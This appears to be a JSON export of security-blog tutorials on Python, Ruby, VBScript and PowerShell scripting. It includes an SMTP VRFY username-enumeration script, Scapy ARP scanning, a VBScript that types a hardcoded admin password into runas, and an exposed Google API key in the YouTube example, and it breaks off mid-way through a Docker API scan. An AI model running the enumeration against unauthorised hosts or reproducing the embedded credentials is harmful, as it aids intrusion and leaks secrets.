usernames\n\n#!/…","frontmatter":{"date":"17th September 2021 ","title":"Python Tutorial","description":"","tags":"python","posttype":"tutorial"},"body":"---\ntitle: Python\nweight: 10\n---\n# Python\n\nsha-bang\n```python\n#!/usr/bin/python\n```\n\nMore portable sha-bang\n```python\n#!/usr/bin/env python\n```\n\nSMTP Script for detecting usernames\n```python\n#!/usr/bin/env python\nimport socket\nimport sys\nif len(sys.argv) != 3:\n    print \"Usage: smtp.py <list usernames> <list of ips>\"\n    sys.exit(0)\n\nusernames = sys.argv[1]\nip_address = sys.argv[2]\n\n\nwith open(ip_address, \"r\") as ips:\n\n    for ip in ips:\n\n        print \"[x]\"+ip\n        # Create a Socket\n        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n        # Connect to the Server\n        connect=s.connect((ip,25))\n\n        # Receive the banner\n        banner=s.recv(1024)\n        print banner\n\n        with open(usernames, \"r\") as users:\n            for user in users:\n                print \"[x]\"+user\n                # VRFY a user\n                s.send('VRFY ' + user + '\\r\\n')\n                result=s.recv(1024)\n                print result\n\n        # Close the socket\n        s.close()\n```\n\n## Scapy\n\n\nLists supported protocol layers. If a protocol layer is given as parameter, lists its fields and types of fields.\n```python\nls()\n```\n\nWe can give the `ls` command individual protocols\n```python\nls(ARP)\nls(ICMP)\n```\n\nLists some user commands. If a command is given as parameter, its documentation is displayed.\n```python\nlsc()\n```\n\nThis object contains the configuration.\n```python\nconf\n```\n\n### Sniffing\n\nSniff 100 packets on interface `eth0`. Important no quotes around count integer.\n```python\npkts = sniff(iface=\"eth0\", count=100)\n```\n\nSniff 10 `Arp` packets on interface `eth0`. Important no quotes around count integer.\n```python\narppkts = sniff(iface=\"eth0\", filter=\"arp\", count=10)\n```\n\nDisplay a packet summary after collection\n```python\npkts\n```\n\nLook at one packet (indexed from 0)\n```python\nprint pkts[0]\n```\n\nShown in more user friendly way\n```python\nprint pkts[0].show()\n```\n\nShown a summary\n```python\nprint pkts[0].show()\n```\n\nWrite to a pcap file\n```python\nwrpcap(\"/tmp/tcpdump-demo\", mypkts)\n```\n\nRead from a pcap file\n```python\nread_pkts = rdpcap(\"/tmp/tcpdump-practice\")\n```\n\nSend an icmp packet\n```python\n>>> pkt = IP(dst=\"192.168.1.69\")/ICMP()/\"EvilSaint was here so look out\"\n>>> send(pkt)\n```\n\n### Scanning\n\nArp scanner\n```python\n#!/usr/bin/python\n\nfrom scapy.all import *\n\n# Subnet Scanner\nfor host in range(64,254):\n        ip = \"192.168.1.\" +str(host)\n        print ip\n        arpRequest = Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=ip, hwdst=\"ff:ff:ff:ff:ff:ff\")\n        arpResponse = srp1(arpRequest, timeout=1, verbose=0)\n        if arpResponse:\n                print \"IP: \" + arpResponse.psrc + \" MAC: \" + arpResponse.hwsrc\n```\n\n### Scraping\n\nPrint Web Page Headers\n```python\nimport urllib\nhttpResponse = urllib.urlopen(\"http://www.nottingham.ac.uk/\")\nfor header, value in httpResponse.headers.items():\n    print header + ' : ' + value\n```\n\nRead the html on the page\n```\nhttpResponse.read()\n```\n\n#### BeautifulSoup\n\n\nGrab Page and Parse it script\n```python\nfrom bs4 import BeautifulSoup\nimport urllib\n\nhtml = urllib.urlopen(\"http://www.securitytube.net/video/3000\")\nbt = BeautifulSoup(html.read(), \"lxml\")\n\nbt.title\n# <title>Defcon 19  - The Art Of Trolling</title>\n\nbt.title.string\n# u'Defcon 19  - The Art Of Trolling'\n\nall_meta_tags = bt.find_all('meta')\nprint all_meta_tags\n# [<meta content=\"6xTaa3p8o4OQd0L-iD2eRvaDjJR8rxUdSyZ1Etm5LMI\" name=\"google-site-verification\"/>, <meta content=\"text/html;charset=unicode-escape\" http-equiv=\"Content-Type\"/>]\n\nprint all_meta_tags[0]\n# <meta content=\"6xTaa3p8o4OQd0L-iD2eRvaDjJR8rxUdSyZ1Etm5LMI\" name=\"google-site-verification\"/>\nprint all_meta_tags[0]['content']\n# 6xTaa3p8o4OQd0L-iD2eRvaDjJR8rxUdSyZ1Etm5LMI\n\natags = bt.find_all('a')\nfor link in atags:\n    print link['href'], link.string\n\n# Get all the text on a page\nbt.get_text()\n```"},{"fields":{"slug":"/ruby-tutorial"},"excerpt":null,"frontmatter":{"date":"17th September 2021 ","title":"Ruby Tutorial","description":"","tags":"ruby","posttype":"tutorial"},"body":"# Ruby\n\n## Gems\n\nGetting help with gems\n```\ngem help\n```\n\nSearching for a gem\n```\ngem search [string]\n```\n\nSearch remotely for a gem related to http\n```\ngem search -r http\n```\n\nTo get help searching\n```\ngem search -h\n```\n\nTo install a gem\n```\ngem install [gem name]\ngem install openssl-extensions\n```\n\nHelp is available with install also\n```\ngem install -h\n```\n\nTo list locally installed gems\n```\ngem list\n```\n\n## Variable Scopes\n\n| Variable | Scope          |\n| -------- | -------------- |\n| @var     | instance scope |\n| @@var    | class scope    |\n| $var     | Global scope   |\n\n## Time and Date\n\nAssign Time right now to a variable\n```ruby\ntime = Time.now\n```\n\n## String Methods\n\nSome example string methods\n```ruby\nst = \"a string for me to be testing\"\nst.empty?\nst.clear\nst.length\nst.size\nst.start_with? \"a\"\nst.eng_with? \"ing\"\nst.insert(10,\"cat\") # insert the word cat at 10th char\nst.upcase\nst.downcase\nst.capitalize\nst.reverse\nst.chop      # removes whatever the trailing char is\n```\n\nUsing pry we could type \"st.\" and then use tab completion to show the possibilities\n\nReferencing parts of a string and assigning values to parts of a string\n\nAssuming `st = \"this is my string\"`\n\nreplaces the word string with code\n```ruby\nst[\"string\"] = \"code\"\n```\n\nreplaces the word \"this\" with \"that\"\n```ruby\nst[1..4] = \"that\"\n```\n\n### Sub and Gsub\n\nSub replaces the first occurrence of a string while Gsub replaces all occurrences. Assuming `st = \"No one is like PHP. PHP is awesome\"`\n```ruby\n>> st.sub(\"PHP\",\"Ruby\")\n=> \"No one is like Ruby. PHP is awesome\"\n\n>> st.gsub(\"PHP\",\"Ruby\")\n=> \"No one is like Ruby. Ruby is awesome\"\n```\n\n> Note, sub and gsub just return a copy of the string with the proper substitution. If you want to modify the original string you have to use sub! or gsub!\n\nMake a permenant change to the variable\n```ruby\nst.sub!(\"Search\",\"Replace\")\nst.gsub!(\"Search\",\"Replace\")\n```\n\n### Freeze and Frozen\n\nIt is  possible to make a string immutable (prevent it from being changed). We can do this with the freeze method. The freeze method works on an object, not the variable that refers to a frozen object.\n\nFreeze (make an object immutable)\n```ruby\nst.freeze\n```\n\nTest if object has been frozen with the freeze method\n```ruby\nst.frozen?\n```\n\nFor example\n```ruby\nst = \"i will make this immutable\"\nst.freeze\nst.concat(\"trying to append\") # this won't work, string itself cannot be altered\n```\n\n> We can change the existing variable but we can assign a new value over the top like this `st = \"new value completely\"`\n\n\n### Bypassing String Escapes\n\nWrite strings without the quotation delimiters\n```ruby\nprint %[delimiter is using the brackets]\n```\n\nA Ruby Heredoc (in this example EVILSAINT is the delimiter)\n```ruby\nSt = <<EVILSAINT\nThis is whatever I want it to be with whatever formatting\nI would like \" \" ' / \\\nOver multiple lines too….\nYeah for             spaces and           heredocs\nEVILSAINT\n```\n\n### Concatenating strings (various methods):\n\n+ notation\n```ruby\nSt = \"Ruby\" + \" is an \" + \"awesome language\"\n```\n\nJuxtaposition\n```ruby\n\"Hello \" \"World\" \"!!!!!!!\"\n```\n\n<< notation\n```ruby\n\"You \" << \"are \" << \"Welcome!\"\n```\n\nOO Style\n```ruby\n\"Ruby \".concat(\"is \").concat(\"awesome!\")\n```\n\n## Arrays\n\nThe following methods can all be used to access different elements of the `days` array\n```ruby\ndays = [\"mon\",\"tues\",\"wed\",\"thu\",\"fri\",\"sat\",\"sun\"]\ndays[3]\ndays[-1]\ndays[-2]\ndays.at(0)\ndays.first\ndays.last\ndays[3..5]\n```\n\nWe can inset into arrays (here we inset the number 10 into the first element)\n```ruby\na = [ 7, 3, 8]\na.insert(1, 10)\n```\n\nWe can also delete. Here is two ways of achieving the same thing. We can delete the value 10 or we can delete the element at index 1\n```ruby\na.delete(10)\na.delete_at(1)\n```\n\nUseful array methods\n```ruby\na = [1, 10, 4, 32, 5, 88, 11, 32]\na.sort\na.reverse\na.uniq\na.max\na.min\na.join(\" \")    # takes an argument to place between items\na.join         # no parameter means array will be joined without\n\"1:2:3:4:5:6\".split \":\"  # makes an array from string\n```\n\n## File System\n\nList Files\n```ruby\nDir[\"/Home/*.txt\"]\n```\n\nCopy Files\n```ruby\nFileUtils.cp('comics.txt', '/Home/comics.txt')\n```\n\nWrite to Files\n```ruby\nFile.open(\"/Home/comics.txt\", \"a\") do |f|\n    f.puts \"put this in file\"\nend\n```\n\nPrint File to Screen\n```ruby\nprint File.read(\"/Home/comics.txt\")\n```\n\nFind out when file was last modified\n```ruby\nFile.mtime(\"/Home/comics.txt\")\nFile.mtime(\"/Home/comics.txt\").hour\n```\n\n## Define a function\n\n```ruby\ndef load_comics( path )\n  comics = {}\n  File.foreach(path) do |line|\n    name, url = line.split(': ')\n    comics[name] = url.strip\n  end\n  comics\nend\n```\n\n## Inheritance\n\n```ruby\nclass ApplicationError\n  def display_error\n    puts \"Error! Error!\"\n  end\nend\n\nclass SuperBadError < ApplicationError\nend\n\nerr = SuperBadError.new\nerr.display_error\n```\n\n## Object Orientated\n```ruby\nClass conventions for setters/getters\n\nattr_reader\nattr_writer\nattr_accessor\n\nModules\n\nmodule ModuleName\n  # Bits 'n pieces\nend\n```\n\n## Ruby One Liners\n\nRuby command line switches\n\n| Option   | Description                                                                                    |\n| -------- | ---------------------------------------------------------------------------------------------- |\n| -I[.ext] | In place edit. If given an extension it backs up first                                         |\n| -e       | Allows you to run a command on the command line as opposed from a script or interactive prompt |\n\nRead a file from command line\n```ruby\n$ ruby -pe 0 'file'\n```\n\nCount the number of lines in a file\n```ruby\n$ ruby -ne 'END {print \"Lines: \",$.,\"\\n\"}' file\n```\n\nMake a backup copy of a file and replace all the 'foo' strings with 'FOO'\n```ruby\n$ ruby -i.bak -pe 'gsub \"foo\", \"FOO\"' *.txt\n```\n\nInteractive Ruby\n```ruby\napt-get install pry\npry --simple-prompt\n```\n\nMake a list of IP addresses\n```ruby\nARGV[1].upto(ARGV[2]) {|i| print ARGV[0],\".\",I,\"\\n\"}\n2.upto(254) {|i| print \"192.168.1\",\".\",I,\"\\n\"}\n```\n\nPinging hosts\n```ruby\n>> require 'net/ping'\n=> true\n>> req = Net::Ping::ICMP.new(\"8.8.8.8\")\n=> #<Net::Ping::ICMP:0x000055f5127a98f8\n```\n\n## Nokogiri\n\n```ruby\nrequire 'open-uri'\nrequire 'nokogiri'\nrequire 'resolv-replace'\neztv = Nokogiri::HTML(open(\"https://eztv.bypassed.eu/shows/887/the-blacklist/\"))\n\n>> eztv.title\n#=> \"EZTV Proxy Mirror - The Blacklist Torrent Download - EZTV\"\n\neztv.xpath(\"//a\").css(\".download_1\").each do |link|\n\tputs \"#{link['title']}: #{link['href']}\"\nend\n\nFile.open(\"blacklist.out\",\"w\") do |line|\n\teztv.xpath(\"//a\").css(\".download_1\").each do |link|\n\t\tline.puts \"#{link['title']} | #{link['href']}\"\n\tend\nend\n\nimdb = Nokogiri::HTML(open(\"http://www.imdb.com/title/tt1405406/episodes?season=1\"))\nimdb.css(\"div.eplist div.info div.image\")[0]\n\nDebug to look where you are in the documentation\n>> links.class.name\n#=> \"Nokogiri::XML::NodeSet\"\n```"},{"fields":{"slug":"/perl-tutorial"},"excerpt":null,"frontmatter":{"date":"17th September 2021 ","title":"Perl Tutorial","description":"","tags":"perl","posttype":"tutorial"},"body":"\n# Perl\n\nWhile many canned security tools are available on this site for handling common tasks, scripting languages allow you to write your own (or modify existing ones) when you need something more custom. Quick, portable scripts can test, exploit, or even fix systems. Archives like <a href=\"http://www.cpan.org\">CPAN are filled with modules such as <a href=\"http://www.ic.al.lg.ua/~ksv/\">Net::RawIP and protocol implementations to make your tasks even easier. Many security tools use scripting languages heavily for extensibility. For example <a class=\"local\" href=\"/tool/scapy/\">Scapy interaction is through a Python interpreter, <a class=\"local\" href=\"/tool/metasploit/\">Metasploit modules are written in Ruby, and <a href=\"http://nmap.org\">Nmap's scripting engine uses Lua.\n\nhttp://www.perl.org\nhttp://www.python.org\nhttp://www.ruby-lang.org\n\n* All official versions are free of charge\n* Works natively on Linux.\n* Works natively on Apple Mac OS X.\n* Works natively on Microsoft Windows.\n* Features a command-line interface.\n* Source code available for inspection.\n* General-purpose tools"},{"fields":{"slug":"/vb-script-tutorial"},"excerpt":"WSH (Windows Scripting Host) is a powerful scripting environment that comes with Windows Operating System. By default, there are two…","frontmatter":{"date":"17th September 2021 ","title":"VB Script Tutorial","description":"","tags":"vbscript","posttype":"tutorial"},"body":"# VB Script\n\nWSH (Windows Scripting Host) is a powerful scripting environment that comes with Windows Operating System. By default, there are two scripting languages supported, which is JScript and VBScript. You could actually open any text editor and write the scripts and save as *.vbs or *.js. Double click them invokes the interpreter, which is cscript.exe or wscript.exe depending on the settings. The `cscript.exe` will output to console (e.g. using `WScript.Echo`) while the `wscript.exe` will treat `WScript.Echo` as `MsgBox` (output using dialog). Sometimes, you could choose other languages as the host languages in WSH, but this is not installed by default, and you have to download corresponding installer.\n\nThe advantages of writing scripts to run in WSH are:\n- You do not need to compile them, just save and run immediately, which are suitable for lightweight small and daily tasks.\n- The scripts can be edited/changed and distributed easily.\n- The same scripts can be interpreted for both 32 and 64 bit, just specify the corresponding cscript.exe or wscript.exe respectively.\n\nYou could actually use `WScript.Shell` object (COM Automation) to `SendKeys` to the active window, in which case, you could do something as powerful as macros. The keystrokes are being sent to the active window.\n\nThe following runs the `notepad.exe` and bring the notepad to the front. The second parameter 9 means: make active and display the window. If the window is minimized or maximized, the system restores it to its original size and position.\n```vbscript\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.Run \"notepad\", 9\n```\n\nNow the following will type in \"Hello, World!\"\" one character after another, with a short pause 200ms between characters. And finally, it will simulate Alt+F4 to exit. At this time, the dialog will pop up for saving, and press Tab to navigate to Don't Save button and press Enter to exit.\n```vbscript\n' Give Notepad time to load\nWScript.Sleep 500\n\nDim Msg: Msg = \"Hello, World!\"\n\n' Type in One Character at a time\nFor i = 1 To Len(Msg)\n        WScript.Sleep 200\n        WshShell.SendKeys Mid(Msg, i, 1)\nNext\n\nWshShell.SendKeys \"{ENTER}\"\nWshShell.SendKeys \"%{F4}\"\nWshShell.SendKeys \"{TAB}\"\nWshShell.SendKeys \"{ENTER}\"\n```\n\n![VBScript Hello World in Notepad](images/2018/03/vbscript-hello-world-in-notepad.png)\n\n> The specified keys, functional keys, ctrl, alt are enclosed by {braces}.\n\n![SendKey Lookup For Special Characters](images/2018/03/sendkey-lookup-for-special-characters.png)\n\nYou can combine keys, for example, + (plus) is the prefix for shift, Ctrl is denoted using prefix ^ and % (percentage) is for ALT.\n\nLet's review the above example one more time, but in JScript.\n```vbscript\n(function () {\n          var WshShell = WScript.CreateObject(\"WScript.Shell\");\n          WshShell.Run(\"notepad\", 9);\n          var msg = \"Hello, World!\";\n          // Give Notepad time to load\n          WScript.Sleep(500);\n          for (i = 0; i < msg.length; i ++) {\n              WScript.Sleep(200);\n              WshShell.SendKeys(msg.charAt(i));\n          }\n          WshShell.SendKeys(\"{ENTER}\");\n          // Alt + F4\n          WshShell.SendKeys(\"%{F4}\");\n          // Naviagate to Don't Save\n          WshShell.SendKeys(\"{TAB}\");\n          // Exit\n          WshShell.SendKeys(\"{ENTER}\");\n})();\n```\n\n## Another SendKey Example\n\n```vbscript\nset WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.run \"runas /user:ladm \" & WScript.Arguments.Item(0)\nWScript.Sleep 1000\nWshShell.SendKeys \"Pm2fUXScqI\"\nWshShell.SendKeys \"{ENTER}\"\nWScript.Sleep 3000\n```\n\nContains a function that will take an argument to the script with \"WScript.Arguments.Item(0)\".\n\nWhen you run the vbscript, make sure you supply the executable name as an argument, which should result in the second line doing `runas /user:ladm executable_name.exe`.\n\nYour command should be something along the lines of:\n```\ncscript vbscript.vbs executable_name.exe\n```\n\nYou should be then able to run the script with your executable as an argument, and it should work."},{"fields":{"slug":"/making-a-you-tube-scraper"},"excerpt":null,"frontmatter":{"date":"25th August 2021 ","title":"Making A YouTube Scraper","description":"","tags":"powershell","posttype":"tutorial"},"body":"## Making A YouTube Scraper\n\n[PowerShell](https://www.notion.so/PowerShell-ebe45d6947664ef293d1c94398b1f1a3) \n\nWhat do we need:\n\n1. Get an API Credential for Youtube\n2. Query the data from Google API\n\n** Get API Credential for YouTube **\n\n<h5 class=\"step\">Step 1</h5>\n First navigate to the following page to setup the Google API [https://console.developers.google.com/apis/dashboard](https://console.developers.google.com/apis/dashboard)\n\n<h5 class=\"step\">Step 2</h5>\n Create a new project\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/61e4f937-0373-499d-9a47-c00e0120097a.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Setting Up a New Project</figure>\n\n\n<h5 class=\"step\">Step 3</h5>\n Then click on Enable APIs and Services. We will need to search for the Youtube API to specify the scope of access.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/41b26f1e-698d-4a12-9f88-827f76ef36bb.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Enabling APIs and Services</figure>\n\n\n<h5 class=\"step\">Step 4</h5>\n Search for Youtube and select Youtube Data API v3, then select `ENABLE`.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/cc0c9cea-105e-4f9e-b086-87e457363469.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>You Need to Enable API Access in Order to Use it</figure>\n\n\n<h5 class=\"step\">Step 5</h5>\n Finally, click on Credentials on the left side, then select Create Credential\n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/21e9104b-a37c-4e94-8498-2eb74bad8705.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Select Credentials From The Left Sidebar</figure> \n\n    \n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/fc96e423-c920-4960-a992-8a6d02cccb65.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Select Create Credentials to Generate New Credentials For The Project</figure>\n\n    \n\n<h5 class=\"step\">Step 6</h5>\n We are presented with two choices. If in doubt you can select \"Help me choose\"\n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/039b5aba-f7d9-4be1-bd66-63cf1a8edb96.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Create Credentials Dropdown</figure>\n\n   \n\n  <h5 class=\"step\">Step 7</h5>\n In this tutorial we will be scraping public data so select that radio option.\n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/217f98c7-63fa-4823-bc22-df10cc458db5.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Hit Next to Configure Public Data Access</figure> \n\n        \n\nAfter hitting 'Next' you should be presented with the following screen.\n\n\n\n  <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/1dad564e-b11c-42d9-a63e-4357be4dcc2f.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Once </figure>  \n\n    \n\n  <h5 class=\"step\">Step 8</h5>\n Click on done to be returned to the dashboard. \n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/cc561404-020d-443a-94ea-10b6a50bf8b1.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption> Copy Google API Credentials From The Dashboard</figure> \n\n   \n\n<h5 class=\"step\">Step 9</h5>\n Select your API Key and open up PowerShell\n\n\n\n## Querying data from the YouTube API \n\n You can find more information on the YouTube API at the following URL: https://developers.google.com/youtube/v3/docs/\n\n  <h5 class=\"step\">Step 1</h5>\n In the first example we will use gather a list of videos for the the EminemVEVO user. In order to get a list of videos we first need a channel ID which we can search for by username. Once we have the channel ID and the number of videos on the channel we can request a list of videos.\n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/52d3665f-15b6-4500-8979-85b921def13b.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Using PowerShell ISE to Query The EminemVEVO YouTube Channel</figure> \n\n    \nHere is the example code.\n\n    ```bash\n    # Get the API Key\n    $GoogleApiKey = 'REDACTED'\n\n    # Query Google API for the details of the EminemVEVO channel\n    $data = Invoke-RestMethod -uri \"https://youtube.googleapis.com/youtube/v3/channels?part=snippet&part=statistics&part=status&forUsername=EminemVEVO&key=$GoogleApiKey\" | Select-Object -expand items\n\n    $channelId = $data.id\n    $maxResults = $data.statistics.videoCount\n\n    # Now we can use the search method to search for all the eminem videos in this channel\n    $eminem = Invoke-RestMethod -uri \"https://www.googleapis.com/youtube/v3/search?channelId=$channelId&order=date&part=snippet&type=video&maxResults=$maxResults&key=$GoogleApiKey\" | Select-Object -expand items\n\n    # List all eminem videos by title\n    $eminem | ForEach-Object { $_.snippet.title }\n    ```\n\nThe output of this command gives us the following.\n\n    ```bash\n    Eminem - Killer (Remix) [Official Audio] ft. Jack Harlow, Cordae\n    Eminem - Alfred&#39;s Theme (Lyric Video)\n    Eminem - Godzilla (Lyric Video) ft. Juice WRLD\n    Eminem - Darkness (Official Video)\n    Eminem - Good Guy (Behind The Scenes) ft. Jessie Reyez\n    Eminem - Good Guy ft. Jessie Reyez\n    Eminem - Venom\n    Eminem - Lucky You ft. Joyner Lucas\n    Eminem - Fall\n    Eminem - Framed\n    Eminem - Nowhere Fast (Extended Version) [Audio] ft. Kehlani\n    Eminem - River (Behind the Scenes) ft. Ed Sheeran\n    Eminem - Untouchable (Lyric Video)\n    Eminem - River ft. Ed Sheeran (Official Video)\n    Eminem - River (Trailer: Boxing) ft. Ed Sheeran\n    Eminem - Walk On Water ft. Beyoncé (Official Behind The Scenes Video)\n    Eminem - Walk On Water (Official Video)\n    Eminem - River (Audio) ft. Ed Sheeran\n    Eminem ft. Beyoncé - Walk On Water (Official Lyric Video)\n    Eminem - Untouchable (Audio)\n    Walk On Water/Stan/Love The Way You Lie (Medley/Live From Saturday Night Live/2017)\n    Eminem - Walk On Water (Audio) ft. Beyoncé\n    Eminem - Partners In Rhyme: The True Story of Infinite (Official Trailer)\n    Eminem - Infinite (F.B.T. Remix) (Official Audio)\n    Eminem - Phenomenal (Behind The Scenes)\n    Eminem - Phenomenal\n    Eminem - Kings Never Die (Lyric Video) ft. Gwen Stefani\n    Eminem - Kings Never Die (Audio) ft. Gwen Stefani\n    Eminem - Phenomenal (Lyric Video)\n    Detroit Vs. Everybody (Behind The Scenes)\n    Detroit Vs. Everybody (Lyric Video)\n    Eminem, Royce da 5&#39;9&quot;, Big Sean, Danny Brown, Dej Loaf, Trick Trick - Detroit Vs. Everybody\n    Eminem - Eminem Interview (CD:UK)\n    Eminem, Slaughterhouse, Yelawolf - CXVPHER (Behind The Scenes)\n    Eminem - Guts Over Fear ft. Sia (Official Video)\n    Vevo Presents: Shady CXVPHER (Official Video)\n    Detroit Vs. Everybody\n    Vevo Presents: SHADY CXVPHER\n    Eminem - Guts Over Fear ft. Sia (Lyric Video)\n    Eminem - Guts Over Fear (Audio) ft. Sia\n    Eminem - Headlights ft. Nate Ruess (Official Music Video)\n    Eminem - The Monster Explained (Behind The Scenes) ft. Rihanna\n    Eminem - The Monster (Edited) ft. Rihanna\n    Eminem ft. Rihanna - The Monster (Explicit) [Official Video]\n    Eminem - The Monster (Teaser) ft. Rihanna\n    Eminem - Rap God (Explicit)\n    Eminem - Survival (Live on SNL)\n    Eminem - Berzerk (Live on SNL)\n    Eminem - The Monster ft. Rihanna (Audio)\n    Eminem - Survival (Explicit)\n    ```\n\n<h5 class=\"step\">Step 2</h5>\nI am aware Eminem might not to be everyone's taste so in this second example we will list ippsec videos.  Here we have the channel ID hardcoded.\n\n   <figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/aa981265-ebdc-42a2-8748-264062c92d55.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>Using PowerShell ISE to Query The IppSec YouTube Channel</figure> \n\n     \nThe example code\n\n\n```bash\n# Get the API Key\n$GoogleApiKey = 'AIzaSyCAhq9IRVmDccixZlOvQ9FFYAWx7Hx3yvY'\n\n$channelId = 'UCa6eh7gCkpPo5XXUDfygQQA'\n$maxResults = 100\n\n# Now we can use the search method to search for all the eminem videos in this channel\n$ippsec = Invoke-RestMethod -uri \"https://www.googleapis.com/youtube/v3/search?channelId=$channelId&order=date&part=snippet&type=video&maxResults=$maxResults&key=$GoogleApiKey\" | Select-Object -expand items\n\n# List all eminem videos by title\n$ippsec | ForEach-Object { $_.snippet.title }\n```\n\nThis gives us the following output.\n\n```bash\nHackTheBox - Proper\nHackTheBox - Crossfit2\nHackTheBox - Love\nHackTheBox - TheNotebook\nHackTheBox - Armageddon\nHackTheBox - Breadcrumbs\nHackTheBox - Atom\nHackTheBox - Ophiuchi\nHackTheBox - Spectra\nHackTheBox - Tentacle\nHackTheBox - Tenet\nHackTheBox - ScriptKiddie\nHackTheBox - Cereal\nHackTheBox - Delivery\nHackTheBox - Ready\nHackTheBox - Attended\nHackTheBox - Sharp\nHackTheBox - Bucket\nHackTheBox - Laboratory\nHackTheBox - APT\nHackTheBox - Time\nHackTheBox - Luanne\nHackTheBox - Crossfit\nHackTheBox - Reel2\nHackTheBox - Passage\nHackTheBox - Academy\nHackTheBox - Feline\nHackTheBox - Jewel\nHackTheBox - Doctor\nHackTheBox - Worker\nHackTheBox - Compromised\nHackTheBox - Rope2\nHackTheBox - Omni\nHackTheBox - Laser\nHackTheBox - OpenKeyS\nHackTheBox - Unbalanced\nHackTheBox - SneakyMailer\nHackTheBox - Buff\nHackTheBox - Intense\nHackTheBox - Academy Intro\nHackTheBox - Tabby\nHackTheBox - Fuse\nHackTheBox - Dyplesher\nHackTheBox - Blunder\nHackTheBox - Cache\nHackTheBox - Blackfield\nHackTheBox - Admirer\nHackTheBox - Multimaster\nHackTheBox - Travel\nHackTheBox - Remote\n```"},{"fields":{"slug":"/linux-file-formatting"},"excerpt":"tabs to spaces (by default without the t it is 8 spaces) expand -t 4 <file> > <new_file>\n\n\nLeading tabs only we add the i option\n\nhttps…","frontmatter":{"date":"18th August 2021 ","title":"Linux File Formatting","description":"a look at several tricks when processing linux files.","tags":"linux","posttype":"tutorial"},"body":"\ntabs to spaces (by default without the `t` it is 8 spaces)\n```\nexpand -t 4 <file> > <new_file>\n```\n\nLeading tabs only we add the `i` option\n\nhttps://linuxhandbook.com/convert-tabs-spaces/"},{"fields":{"slug":"/3-des-support-for-open-ssl"},"excerpt":"git clone https://github.com/drwetter/testssl.sh/ /opt cd /opt/testssl.sh/bin\ncp openssl.Linux.x86_64 /usr/bin/\necho \"export OPENSSL_CONF…","frontmatter":{"date":"17th August 2021 ","title":"3DES Support For OpenSSL","description":"","tags":"ssl, tls","posttype":"blog"},"body":"\n```\ngit clone https://github.com/drwetter/testssl.sh/ /opt\ncd /opt/testssl.sh/bin\ncp openssl.Linux.x86_64 /usr/bin/\necho \"export OPENSSL_CONF=/etc/ssl/\" >> ~/.bashrc\nbash\ncd ~/\nopenssl.Linux.x86_64 s_client -connect x.x.x.x:443 -cipher 3DES -tls1\n```"},{"fields":{"slug":"/advanced-phishing-tactics"},"excerpt":"","frontmatter":{"date":"17th August 2021 ","title":"Advanced Phishing Tactics","description":"This is the article summary at the top.","tags":"red-teaming","posttype":"article"},"body":""},{"fields":{"slug":"/securely-accessing-remote-docker-host"},"excerpt":"Docker is running out box without the socket set evilsaint@marvel.lab:~# docker ps\nCannot connect to the Docker daemon at unix:///var/run…","frontmatter":{"date":"16th August 2021 ","title":"Securely Accessing Remote Docker Host","description":"The Docker TCP socket by default doesn't support any authentication. and, if the Docker socket is exposed on an external interface, anyone can connect to it and issue docker commands. This can even lead to host takeover if the Docker daemon is running as root.","tags":"docker","posttype":"article"},"body":"Docker is running out box without the socket set\n```\nevilsaint@marvel.lab:~# docker ps\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n\nevilsaint@marvel.lab:~# docker images\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n```\n\n\nNmap Scan showing exposed Docker API port. \n```\nnmap -sSV -p- 192.190.96.3\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 00:34 IST\nNmap scan report for docker-host (192.190.96.3)\nHost is up (0.000015s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n2375/tcp open  docker     Docker 19.03.1 (API 1.40)\n2376/tcp open  tcpwrapped\nMAC Address: 